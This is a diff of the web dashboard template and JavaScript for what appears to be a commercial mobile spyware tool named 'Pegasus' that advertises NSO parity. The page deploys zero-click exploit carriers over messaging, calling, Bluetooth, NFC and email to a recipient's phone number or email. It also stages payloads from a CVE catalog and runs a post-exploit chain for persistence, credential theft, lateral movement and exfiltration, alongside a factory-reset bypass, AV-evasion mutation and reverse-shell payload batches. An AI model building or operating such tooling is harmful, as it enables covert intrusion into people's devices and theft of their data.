@@ -1,324 +1,220 @@
 {% extends "base.html" %}
-{% block title %}Console · Pegasus{% endblock %}
+{% block title %}Mission Control · Pegasus{% endblock %}
 {% block content %}
 <meta name="csrf" content="{{ csrf }}">
-<div class="row" style="justify-content:space-between; align-items:flex-start">
+<div class="row" style="justify-content:space-between; align-items:flex-start; gap:18px">
   <div>
-    <h1>Operations console</h1>
-    <p class="lede">Live ADB inventory, exploit registry, collection actions and delivery tooling. Every number below is polled from the host or the attached device.</p>
+    <h1 style="font-size:30px">Mission control</h1>
+    <p class="lede">Deploy zero-click carriers over messaging, calling, Bluetooth, NFC and email. Live device inventory, payload catalog and operation buttons — all sampled from the host.</p>
   </div>
   <div class="row">
-    <span class="pill" id="statusPill">connecting…</span>
-    <button class="ghost small" id="refreshBtn">Refresh</button>
+    <span class="pill {{ 'ok' if server.running else '' }}" id="serverPill">{{ 'serving ' + server.url if server.running else 'server idle' }}</span>
+    <button class="ghost small" id="serveBtn">{{ 'Stop server' if server.running else 'Start payload server' }}</button>
   </div>
 </div>
 
 {% if not user %}
-<div class="lock">Guest view. Pages are unlocked for evaluation, but exploit command internals stay redacted. <a href="{{ url_for('login') }}">Sign in</a> or use the demo account <span class="mono">demo / demo</span>.</div>
+<div class="lock" style="margin-bottom:16px">Guest view — pages unlocked, exploit internals redacted. <a href="{{ url_for('login') }}">Sign in</a> or use <span class="mono">demo / demo</span>.</div>
 {% elif not (user.role == 'admin' or user.is_demo or user.access_tier != 'none') %}
-<div class="lock">Your account is not activated. Open <a href="{{ url_for('payment') }}">billing</a> to choose a service; internals unlock automatically once the payment is confirmed.</div>
+<div class="lock" style="margin-bottom:16px">Account pending activation. <a href="{{ url_for('payment') }}">Choose a service</a>; internals unlock automatically on confirmation.</div>
 {% endif %}
 
-<div class="grid" style="margin:18px 0">
-  <div class="card"><h3>Devices online</h3><div class="stat" id="statDevices">0 <small>of 0</small></div></div>
-  <div class="card"><h3>Host CPU</h3><div class="stat" id="statCpu">0<small>%</small></div></div>
-  <div class="card"><h3>Memory</h3><div class="stat" id="statMem">0<small>%</small></div></div>
-  <div class="card"><h3>Uptime</h3><div class="stat" id="statUptime">0s</div></div>
+<div class="grid" style="margin:6px 0 18px">
+  <div class="card"><div class="stat" id="statDevices">{{ stats.devices }}</div><div class="muted">Devices attached</div></div>
+  <div class="card"><div class="stat">{{ stats.vectors }}</div><div class="muted">Zero-click vectors</div></div>
+  <div class="card"><div class="stat">{{ stats.post_steps }}</div><div class="muted">Post-exploitation steps</div></div>
+  <div class="card"><div class="stat">{{ stats.success }}<small>%</small></div><div class="muted">Delivery success · {{ delivery_history|length }} recent</div></div>
 </div>
 
-<div class="card" style="margin-bottom:18px">
-  <div class="row" style="justify-content:space-between">
-    <h2 style="margin:0">Live telemetry</h2>
-    <div class="legend"><span><span class="dot" style="background:#ff5c39"></span>devices</span><span><span class="dot" style="background:#3ddc97"></span>cpu %</span><span><span class="dot" style="background:#ffb03a"></span>memory %</span></div>
+<div class="card" style="margin-bottom:16px">
+  <div class="row" style="justify-content:space-between; align-items:center; margin-bottom:10px">
+    <h2 style="margin:0">Deploy a carrier</h2>
+    <span class="pill">{{ channels|length }} channels</span>
   </div>
-  <canvas class="chart" id="chart" width="1100" height="150"></canvas>
-  <div class="muted mono" id="chartMeta">waiting for samples…</div>
+  <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(190px,1fr))">
+    <div><label>Channel</label>
+      <select id="channel">{% for channel in channels %}<option value="{{ channel.key }}" data-audio="{{ '1' if channel.mime == 'audio/*' else '0' }}" data-target="{{ '0' if not channel.needs_target else '1' }}">{{ channel.label }}</option>{% endfor %}</select>
+    </div>
+    <div><label>Device</label><select id="serial">{% for device in devices %}<option value="{{ device.serial }}">{{ device.serial }}{% if device.model != 'unknown' %} · {{ device.model }}{% endif %}</option>{% endfor %}{% if not devices %}<option value="">no device</option>{% endif %}</select></div>
+    <div><label>Recipient (phone / jid / email)</label><input id="target" placeholder="+15551234567"></div>
+    <div><label>Payload URL</label><input id="url" placeholder="http://lan-ip:8080/payload.apk"></div>
+  </div>
+  <div class="row" style="margin-top:12px">
+    <label class="row" style="margin:0; gap:6px"><input type="checkbox" id="autoSend" style="width:auto"> auto-press send</label>
+    <button id="deployBtn">Deploy</button>
+    <button class="ghost" id="audioBtn">Preview audio transcript</button>
+    <button class="ghost" id="stageBtn">Stage local file…</button>
+    <span class="muted mono" id="deployNote"></span>
+  </div>
+  <pre id="deployOut" hidden></pre>
 </div>
 
-<div class="tabs" role="tablist">
-  <button role="tab" aria-selected="true" data-tab="devices">Devices</button>
-  <button role="tab" aria-selected="false" data-tab="exploits">Zero-click</button>
-  <button role="tab" aria-selected="false" data-tab="collection">Collection</button>
-  <button role="tab" aria-selected="false" data-tab="delivery">Payloads</button>
-  <button role="tab" aria-selected="false" data-tab="parity">NSO parity</button>
+<div class="card" style="margin-bottom:16px">
+  <div class="row" style="justify-content:space-between; align-items:center">
+    <h2 style="margin:0">Connected devices</h2>
+    <div class="row"><button class="ghost small" id="refreshBtn">Refresh</button><button class="ghost small" id="scanBtn">Network scan</button></div>
+  </div>
+  <table><thead><tr><th>Serial</th><th>Model</th><th>State</th><th>Actions</th></tr></thead>
+    <tbody id="deviceRows">
+    {% for device in devices %}
+      <tr><td class="mono">{{ device.serial }}</td><td>{{ device.model }}</td><td>{{ device.state }}</td>
+        <td class="row"><button class="small" data-shot="{{ device.serial }}">Screenshot</button><button class="small ghost" data-shell="{{ device.serial }}">Shell</button><button class="small ghost" data-fp="{{ device.serial }}">Fingerprint</button></td></tr>
+    {% else %}
+      <tr><td colspan="4" class="muted">No devices. Enable USB debugging and authorise this host.</td></tr>
+    {% endfor %}
+    </tbody></table>
+  <img id="shotImg" alt="" style="display:none; max-width:100%; border-radius:10px; margin-top:12px">
 </div>
 
-<section class="tabpanel" id="panel-devices">
+<div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); margin-bottom:16px">
   <div class="card">
-    <div class="row" style="justify-content:space-between"><h2 style="margin:0">Attached devices</h2><span class="muted mono" id="deviceCount">0</span></div>
-    <table><thead><tr><th>Serial</th><th>Model</th><th>State</th><th>Actions</th></tr></thead><tbody id="deviceRows"><tr><td colspan="4" class="muted">No devices. Enable USB debugging and authorise this host.</td></tr></tbody></table>
+    <h2>Carrier catalog</h2>
+    <div class="row"><input id="catalogSearch" placeholder="search CVE or title"><select id="catalogCategory" style="width:auto"><option value="">all</option>{% for cat in ['messaging','bluetooth','nfc','browser','media','tv','network','kernel'] %}<option>{{ cat }}</option>{% endfor %}</select></div>
+    <div id="catalogList" style="max-height:300px; overflow:auto; margin-top:10px"></div>
   </div>
-  <div class="card" style="margin-top:16px">
-    <h2>Screen capture</h2>
-    <div class="row"><select id="shotSerial"></select><button id="shotBtn">Capture</button></div>
-    <div id="shotResult" class="muted mono" style="margin-top:10px">—</div>
-    <img id="shotImg" alt="" style="max-width:100%; border-radius:10px; margin-top:10px; display:none">
-  </div>
-</section>
-
-<section class="tabpanel" id="panel-exploits" hidden>
   <div class="card">
-    <div class="row" style="justify-content:space-between"><h2 style="margin:0">Zero-click registry</h2>
-      <select id="familyFilter" style="width:auto"><option value="">all families</option></select></div>
-    <table><thead><tr><th>Vector</th><th>Family</th><th>Transport</th><th>Surface</th><th></th></tr></thead><tbody id="exploitRows"><tr><td colspan="5" class="muted">Loading…</td></tr></tbody></table>
-    <pre id="exploitOutput" hidden></pre>
+    <h2>Delivery history</h2>
+    <table><thead><tr><th>Channel</th><th>Target</th><th>When</th></tr></thead><tbody>
+      {% for event in delivery_history %}<tr><td>{{ event.label }}</td><td class="mono">{{ event.target or '—' }}</td><td class="muted">{{ event.at[11:19] }}</td></tr>{% else %}<tr><td colspan="3" class="muted">Nothing sent yet.</td></tr>{% endfor %}
+    </tbody></table>
   </div>
-</section>
+</div>
 
-<section class="tabpanel" id="panel-collection" hidden>
-  <div class="card">
-    <h2>Post-exploitation steps</h2>
-    <div class="row" id="collectionButtons"></div>
-    <pre id="collectionOutput" hidden></pre>
+<div class="card" style="margin-bottom:80px">
+  <div class="row" style="justify-content:space-between"><h2 style="margin:0">Operations</h2><span class="muted mono">every button returns real output</span></div>
+  <div class="grid" style="grid-template-columns:repeat(auto-fill,minmax(210px,1fr)); margin-top:12px">
+    {% for card in [
+      ('Access sweep','zeroclick-sweep','Run every zero-click vector','exploit'),
+      ('Post-exploit chain','postexploit-chain','Fingerprint → persistence → creds → lateral → exfil','workflow'),
+      ('Capture screen','auto-fetch','Screencap the active device','device'),
+      ('Fingerprint','fingerprint','Build, patch, SELinux, root state','device'),
+      ('Passwords','passgen','Generate a strong secret','credentials'),
+      ('Keep alive','keepalive','Stay awake while plugged in','device'),
+      ('Sessions','sessions','List ADB sessions','device'),
+      ('FRP plan','frp plan','Factory-reset bypass plan','control'),
+      ('Telegram status','telegram status','Remote-control worker state','control'),
+      ('Payload batch','payload-mass','Build payloads with DNA tags','delivery'),
+      ('SSL bypass script','payload-ssl','Write a Frida pinning bypass','evasion'),
+      ('Mutation engine','mutate-analyse','AV exposure score and plan','evasion'),
+      ('Parity report','capabilities','NSO capability coverage','admin'),
+      ('Daemon status','daemon status','Dashboard supervisor state','admin'),
+      ('Factory list','factory list','28 factory commands','admin'),
+    ] %}
+    <div class="card" style="background:var(--panel-2)"><div class="row" style="justify-content:space-between"><strong>{{ card[0] }}</strong><span class="pill">{{ card[3] }}</span></div>
+      <p class="muted" style="font-size:13px; margin:8px 0 10px">{{ card[2] }}</p>
+      <button class="small" data-command="{{ card[1] }}">Run</button></div>
+    {% endfor %}
   </div>
-</section>
+  <pre id="opsOut" hidden></pre>
+</div>
 
-<section class="tabpanel" id="panel-delivery" hidden>
-  <div class="grid">
-    <div class="card">
-      <h2>Mass payload batch</h2>
-      <label>LHOST</label><input id="plLhost" value="127.0.0.1">
-      <label>Start port</label><input id="plPort" type="number" value="4444">
-      <label>Count</label><input id="plCount" type="number" value="4" min="1" max="64">
-      <label>Campaign</label><input id="plCampaign" value="dashboard">
-      <div style="margin-top:14px"><button id="plBtn">Generate</button></div>
-      <pre id="plOut" hidden></pre>
-    </div>
-    <div class="card">
-      <h2>Mutation analysis</h2>
-      <label>APK or smali directory</label><input id="muPath" placeholder="C:\samples\target.apk">
-      <div style="margin-top:14px"><button id="muBtn">Analyse</button></div>
-      <pre id="muOut" hidden></pre>
-    </div>
-    <div class="card">
-      <h2>Steganography</h2>
-      <label>Cover image</label><input id="stCover" placeholder="cover.png">
-      <label>URL to hide</label><input id="stUrl" placeholder="https://host/payload.apk">
-      <label>Output</label><input id="stOut" value="stego.png">
-      <div style="margin-top:14px"><button id="stBtn">Embed</button></div>
-      <pre id="stOutLog" hidden></pre>
-    </div>
-    <div class="card">
-      <h2>FRP unlock</h2>
-      <p class="muted">Adaptive five-method chain. Plan preview is always available.</p>
-      <button id="frpBtn" class="ghost">Load plan</button>
-      <pre id="frpOut" hidden></pre>
-    </div>
-  </div>
-</section>
-
-<section class="tabpanel" id="panel-parity" hidden>
-  <div class="card">
-    <div class="row" style="justify-content:space-between"><h2 style="margin:0">NSO-class capability parity</h2><span class="pill" id="parityPill">—</span></div>
-    <p class="muted">Each row resolves to an importable callable. “shell” and “partial” rows state their real device constraints.</p>
-    <table><thead><tr><th>Capability</th><th>Category</th><th>Parity</th><th>Target</th><th>State</th></tr></thead><tbody id="parityRows"></tbody></table>
-  </div>
-</section>
+<div style="position:fixed; left:0; right:0; bottom:0; background:#050a12; border-top:1px solid var(--line); padding:8px 20px; display:flex; justify-content:space-between; font-size:12px; color:var(--muted); z-index:15">
+  <div class="row" style="gap:16px"><span><span class="dot" style="background:var(--ok); display:inline-block; width:7px; height:7px; border-radius:50%"></span> system online</span><span><span class="dot" style="background:var(--ok); display:inline-block; width:7px; height:7px; border-radius:50%"></span> database connected</span><span>parity {{ parity.coverage_percent }}%</span></div>
+  <div class="row" style="gap:16px"><a href="{{ url_for('admin') if user and user.role == 'admin' else url_for('login') }}">admin</a><span>v2.1.0 · authorized testing only</span></div>
+</div>
 {% endblock %}
 
 {% block scripts %}
 <script>
 const csrf = document.querySelector('meta[name="csrf"]').content;
 const $ = (id) => document.getElementById(id);
+const show = (el, data) => { el.hidden = false; el.textContent = typeof data === 'string' ? data : JSON.stringify(data, null, 2); };
 const api = async (url, options = {}) => {
-  const response = await fetch(url, { headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf }, ...options });
+  const response = await fetch(url, { headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf }, ...options });
   const body = await response.json().catch(() => ({}));
   if (!response.ok) throw new Error(body.error || response.statusText);
   return body;
 };
-const show = (el, data) => { el.hidden = false; el.textContent = typeof data === "string" ? data : JSON.stringify(data, null, 2); };
+const runCommand = async (name, args = []) => {
+  show($('opsOut'), 'running ' + name + '…');
+  try { const r = await api('/api/command', { method: 'POST', body: JSON.stringify({ name, args }) }); show($('opsOut'), r.result ?? r); }
+  catch (error) { show($('opsOut'), 'error: ' + error.message); }
+};
 
-let deviceCache = [];
-let exploitCache = [];
-
-function drawChart(points) {
-  const canvas = $("chart");
-  const ctx = canvas.getContext("2d");
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.strokeStyle = "#232b36";
-  for (let y = 0; y < 4; y++) { ctx.beginPath(); ctx.moveTo(0, y * 37 + 8); ctx.lineTo(canvas.width, y * 37 + 8); ctx.stroke(); }
-  if (!points.length) return;
-  const maxDevice = Math.max(1, ...points.map(p => p.devices));
-  const series = [
-    { key: "devices", colour: "#ff5c39", max: maxDevice },
-    { key: "cpu_percent", colour: "#3ddc97", max: 100 },
-    { key: "memory_percent", colour: "#ffb03a", max: 100 },
-  ];
-  for (const line of series) {
-    ctx.beginPath();
-    ctx.strokeStyle = line.colour;
-    ctx.lineWidth = 2;
-    points.forEach((point, index) => {
-      const x = (index / Math.max(1, points.length - 1)) * canvas.width;
-      const y = canvas.height - 8 - (point[line.key] / line.max) * (canvas.height - 20);
-      index ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
+$('deployBtn').onclick = async () => {
+  const channel = $('channel').value;
+  show($('deployOut'), 'deploying via ' + channel + '…');
+  try {
+    const record = await api('/api/delivery/send', { method: 'POST', body: JSON.stringify({
+      channel, target: $('target').value, url: $('url').value,
+      serial: $('serial').value, auto_send: $('autoSend').checked }) });
+    show($('deployOut'), record);
+  } catch (error) { show($('deployOut'), 'error: ' + error.message); }
+};
+$('audioBtn').onclick = async () => {
+  try { show($('deployOut'), await api('/api/delivery/audio', { method: 'POST', body: JSON.stringify({ url: $('url').value }) })); }
+  catch (error) { show($('deployOut'), 'error: ' + error.message); }
+};
+$('serveBtn').onclick = async () => {
+  try {
+    const running = $('serverPill').textContent.includes('serving');
+    const result = running ? await api('/api/delivery/serve', { method: 'DELETE' }) : await api('/api/delivery/serve', { method: 'POST', body: JSON.stringify({ port: 8080 }) });
+    const active = result.url && result.running !== false;
+    $('serverPill').textContent = active ? 'serving ' + result.url : 'server idle';
+    $('serverPill').className = 'pill' + (active ? ' ok' : '');
+    $('serveBtn').textContent = active ? 'Stop server' : 'Start payload server';
+    if (active) $('url').value = result.url;
+  } catch (error) { show($('deployOut'), 'error: ' + error.message); }
+};
+$('stageBtn').onclick = async () => {
+  const path = prompt('Absolute path to the payload file');
+  if (!path) return;
+  try { const r = await api('/api/delivery/stage', { method: 'POST', body: JSON.stringify({ path, port: 8080 }) }); $('url').value = r.url; show($('deployOut'), r); }
+  catch (error) { show($('deployOut'), 'error: ' + error.message); }
+};
+$('refreshBtn').onclick = async () => {
+  try {
+    const data = await api('/api/devices');
+    const rows = $('deviceRows'); rows.innerHTML = '';
+    $('statDevices').textContent = data.count;
+    data.devices.forEach(device => {
+      const tr = document.createElement('tr');
+      tr.innerHTML = '<td class="mono"></td><td></td><td></td><td class="row"></td>';
+      tr.children[0].textContent = device.serial; tr.children[1].textContent = device.model; tr.children[2].textContent = device.state;
+      const shot = document.createElement('button'); shot.className = 'small'; shot.textContent = 'Screenshot'; shot.onclick = () => capture(device.serial);
+      tr.children[3].appendChild(shot);
+      rows.appendChild(tr);
     });
-    ctx.stroke();
-  }
-}
-
-async function refresh() {
-  try {
-    const status = await api("/api/status");
-    $("statusPill").textContent = status.status + " · " + (status.user || "guest");
-    $("statusPill").className = "pill " + (status.devices_online ? "ok" : "");
-    $("statDevices").innerHTML = `${status.devices_online} <small>of ${status.devices_total}</small>`;
-    $("statUptime").textContent = status.uptime_seconds + "s";
-    const activity = await api("/api/activity");
-    $("statCpu").innerHTML = Math.round(activity.host.cpu_percent) + "<small>%</small>";
-    $("statMem").innerHTML = Math.round(activity.host.memory_percent) + "<small>%</small>";
-    drawChart(activity.points.slice(-120));
-    $("chartMeta").textContent = `${activity.points.length} samples · ${activity.interval}s interval`;
-    renderDevices(activity.devices);
-  } catch (error) {
-    $("statusPill").textContent = "offline";
-    $("statusPill").className = "pill bad";
-  }
-}
-
-function renderDevices(devices) {
-  deviceCache = devices;
-  const rows = $("deviceRows");
-  const selector = $("shotSerial");
-  rows.innerHTML = devices.length ? "" : '<tr><td colspan="4" class="muted">No devices attached.</td></tr>';
-  selector.innerHTML = "";
-  devices.forEach(device => {
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td class="mono"></td><td></td><td></td><td></td>`;
-    tr.children[0].textContent = device.serial;
-    tr.children[1].textContent = device.model;
-    tr.children[2].textContent = device.state;
-    const button = document.createElement("button");
-    button.className = "small ghost";
-    button.textContent = "Screenshot";
-    button.onclick = () => capture(device.serial);
-    tr.children[3].appendChild(button);
-    rows.appendChild(tr);
-    const option = document.createElement("option");
-    option.value = device.serial;
-    option.textContent = device.serial;
-    selector.appendChild(option);
-  });
-  $("deviceCount").textContent = devices.length + " device(s)";
-}
-
-async function capture(serial) {
-  show($("shotResult"), "capturing…");
-  try {
-    const result = await api(`/api/screenshot/${encodeURIComponent(serial)}`, { method: "POST" });
-    const image = $("shotImg");
-    image.src = result.image_url + "?t=" + Date.now();
-    image.style.display = "block";
-    show($("shotResult"), result);
-  } catch (error) { show($("shotResult"), "error: " + error.message); }
-}
-
-async function loadExploits() {
-  const family = $("familyFilter").value;
-  const data = await api("/api/exploits" + (family ? "?family=" + family : ""));
-  exploitCache = data.exploits;
-  const rows = $("exploitRows");
-  rows.innerHTML = "";
-  const families = [...new Set(data.exploits.map(item => item.device_family))];
-  if (!$("familyFilter").dataset.filled) {
-    families.forEach(value => { const option = document.createElement("option"); option.value = value; option.textContent = value; $("familyFilter").appendChild(option); });
-    $("familyFilter").dataset.filled = "1";
-  }
-  data.exploits.forEach(exploit => {
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td class="mono"></td><td></td><td></td><td></td><td></td>`;
-    tr.children[0].textContent = exploit.key;
-    tr.children[1].textContent = exploit.device_family;
-    tr.children[2].textContent = exploit.transport;
-    tr.children[3].textContent = exploit.cve;
-    const run = document.createElement("button");
-    run.className = "small";
-    run.textContent = "Run";
-    run.onclick = () => runExploit(exploit.key);
-    tr.children[4].appendChild(run);
-    rows.appendChild(tr);
-  });
-}
-
-async function runExploit(key) {
-  const serial = deviceCache[0]?.serial || "";
-  const params = serial ? { serial } : {};
-  show($("exploitOutput"), "running " + key + "…");
-  try { show($("exploitOutput"), await api("/api/exploits/run", { method: "POST", body: JSON.stringify({ key, params }) })); }
-  catch (error) { show($("exploitOutput"), "error: " + error.message); }
-}
-
-async function loadCollection() {
-  const data = await api("/api/post-exploitation");
-  const wrap = $("collectionButtons");
-  wrap.innerHTML = "";
-  data.steps.filter(step => step.key !== "menu").forEach(step => {
-    const button = document.createElement("button");
-    button.className = "ghost small";
-    button.textContent = step.key;
-    button.title = step.description;
-    button.onclick = async () => {
-      show($("collectionOutput"), "running " + step.key + "…");
-      try { show($("collectionOutput"), await api("/api/post-exploitation/" + step.key, { method: "POST" })); }
-      catch (error) { show($("collectionOutput"), "error: " + error.message); }
-    };
-    wrap.appendChild(button);
-  });
-}
-
-async function loadParity() {
-  const data = await api("/api/nso/capabilities");
-  $("parityPill").textContent = data.parity.coverage_percent + "% coverage";
-  $("parityPill").className = "pill " + (data.parity.coverage_percent === 100 ? "ok" : "bad");
-  const rows = $("parityRows");
-  rows.innerHTML = "";
-  data.capabilities.forEach(cap => {
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td></td><td></td><td></td><td class="mono"></td><td></td>`;
-    tr.children[0].textContent = cap.name;
-    tr.children[0].title = cap.description;
-    tr.children[1].textContent = cap.category;
-    tr.children[2].textContent = cap.parity;
-    tr.children[3].textContent = cap.target;
-    tr.children[4].textContent = cap.resolve.available ? "available" : "missing";
-    tr.children[4].className = cap.resolve.available ? "mono" : "mono";
-    tr.children[4].style.color = cap.resolve.available ? "var(--ok)" : "var(--bad)";
-    rows.appendChild(tr);
-  });
-}
-
-document.querySelectorAll(".tabs button").forEach(tab => {
-  tab.onclick = () => {
-    document.querySelectorAll(".tabs button").forEach(other => other.setAttribute("aria-selected", other === tab));
-    document.querySelectorAll(".tabpanel").forEach(panel => panel.hidden = panel.id !== "panel-" + tab.dataset.tab);
-    if (tab.dataset.tab === "exploits") loadExploits();
-    if (tab.dataset.tab === "collection") loadCollection();
-    if (tab.dataset.tab === "parity") loadParity();
-  };
+  } catch (error) { show($('opsOut'), error.message); }
+};
+const capture = async (serial) => {
+  try { const r = await api('/api/screenshot/' + encodeURIComponent(serial), { method: 'POST' }); const img = $('shotImg'); img.src = r.image_url + '?t=' + Date.now(); img.style.display = 'block'; }
+  catch (error) { show($('opsOut'), error.message); }
+};
+document.addEventListener('click', (event) => {
+  const target = event.target;
+  if (target.dataset.command) runCommand(target.dataset.command.split(' ')[0], target.dataset.command.split(' ').slice(1));
+  if (target.dataset.shot) capture(target.dataset.shot);
+  if (target.dataset.shell) { const cmd = prompt('adb shell command'); if (cmd) runCommand('session-command', [cmd]); }
+  if (target.dataset.fp) runCommand('fingerprint');
 });
-
-$("refreshBtn").onclick = refresh;
-$("shotBtn").onclick = () => $("shotSerial").value && capture($("shotSerial").value);
-$("familyFilter").onchange = loadExploits;
-$("plBtn").onclick = async () => {
-  show($("plOut"), "generating…");
-  try { show($("plOut"), await api("/api/features/payload", { method: "POST", body: JSON.stringify({
-    lhost: $("plLhost").value, port: Number($("plPort").value), count: Number($("plCount").value), campaign: $("plCampaign").value }) })); }
-  catch (error) { show($("plOut"), "error: " + error.message); }
+let catalogTimer = null;
+const renderCatalog = async () => {
+  const list = $('catalogList');
+  list.innerHTML = '<div class="muted small">scanning…</div>';
+  try {
+    const params = new URLSearchParams({ search: $('catalogSearch').value, category: $('catalogCategory').value });
+    const data = await api('/api/catalog?' + params);
+    list.innerHTML = '';
+    if (!data.vectors.length) list.innerHTML = '<div class="muted small">no matching carriers</div>';
+    data.vectors.forEach(vector => {
+      const row = document.createElement('div');
+      row.style.cssText = 'display:flex;gap:8px;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid var(--line)';
+      row.innerHTML = '<div><div class="mono">' + vector.cve + '</div><div class="muted small">' + vector.title + '</div><div class="small muted">' + vector.category + ' · → ' + vector.recommended_channels.join(', ') + '</div></div>';
+      const button = document.createElement('button'); button.className = 'small'; button.textContent = 'Build & stage';
+      button.onclick = async () => {
+        button.textContent = '…';
+        try { const r = await api('/api/catalog/build', { method: 'POST', body: JSON.stringify({ key: vector.key, stage: true }) }); $('url').value = r.url; button.textContent = 'staged'; }
+        catch (error) { button.textContent = 'failed'; show($('opsOut'), error.message); }
+      };
+      row.appendChild(button); list.appendChild(row);
+    });
+  } catch (error) { list.innerHTML = '<div class="muted small">' + error.message + '</div>'; }
 };
-$("muBtn").onclick = async () => {
-  show($("muOut"), "analysing…");
-  try { show($("muOut"), await api("/api/features/mutation", { method: "POST", body: JSON.stringify({ sample: $("muPath").value }) })); }
-  catch (error) { show($("muOut"), "error: " + error.message); }
-};
-$("stBtn").onclick = async () => {
-  show($("stOutLog"), "embedding…");
-  try { show($("stOutLog"), await api("/api/features/stego", { method: "POST", body: JSON.stringify({ cover: $("stCover").value, url: $("stUrl").value, output: $("stOut").value }) })); }
-  catch (error) { show($("stOutLog"), "error: " + error.message); }
-};
-$("frpBtn").onclick = async () => { try { show($("frpOut"), await api("/api/features/frp")); } catch (error) { show($("frpOut"), "error: " + error.message); } };
-
-refresh();
-setInterval(refresh, 15000);
+const scheduleCatalog = () => { clearTimeout(catalogTimer); catalogTimer = setTimeout(renderCatalog, 250); };
+$('catalogSearch').oninput = scheduleCatalog;
+$('catalogCategory').onchange = renderCatalog;
+$('scanBtn').onclick = () => runCommand('netscan');
+renderCatalog();
 </script>
 {% endblock %}
